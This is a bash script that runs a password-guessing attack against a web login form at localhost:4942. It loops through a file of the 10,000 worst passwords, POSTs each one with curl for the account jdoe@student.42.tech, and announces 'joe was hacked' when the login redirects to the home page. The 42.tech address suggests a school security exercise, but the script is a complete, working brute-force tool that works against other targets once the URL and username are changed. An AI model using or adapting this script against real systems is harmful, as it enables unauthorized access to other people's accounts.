#!/usr/bin/env bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

script_directory=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
domain="http://localhost:4942"
filepath="$script_directory/Resources/10k-worst-passwords.txt"
cookie_file="$script_directory/cookie.txt"
joe="jdoe@student.42.tech"
while read p; do
    location=$(curl -X POST "$domain"/login \
      -s \
      -w "%{redirect_url}" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "identity=$joe&password=$p" \
      -c "$cookie_file");
    echo "password: $(make_blue $p), location: $location";
     if [[ "$location" == "http://localhost:4942/" ]]; then
         echo "$(make_green SUCCESS!) joe was hacked. password: $p"
        break
     fi
done <$filepath
